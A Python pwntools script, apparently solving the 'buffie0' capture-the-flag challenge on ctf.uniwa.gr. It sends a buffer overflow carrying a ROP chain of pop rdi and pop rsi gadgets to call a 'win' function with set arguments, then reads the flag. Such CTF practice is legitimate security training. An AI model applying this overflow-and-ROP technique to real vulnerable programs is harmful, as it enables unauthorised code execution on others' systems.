#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr'
port = 2004
filename = './buffie0'

def pwn():
    #r = remote(ip, port)
    r = process(filename)
    elf = ELF(filename)
    rop = ROP(elf)
    win = p64(elf.symbols['win'])
    junk = b'z'*120
    arg1 = p64(0xdeadbeef)
    arg2 = p64(0x9)
    pop_rdi = p64((rop.find_gadget(['pop rdi']))[0]) 
    pop_rsi = p64((rop.find_gadget(['pop rsi']))[0]) 
    fake = p64(0x0)
    payload = junk +  pop_rdi + arg1 + pop_rsi + arg2 + fake + win
    r.sendlineafter('friend..', payload)
    r.recvlines(6)
    flag = r.recvline()
    log.success('Flag: {}'.format(flag.decode('utf8')))
    
pwn()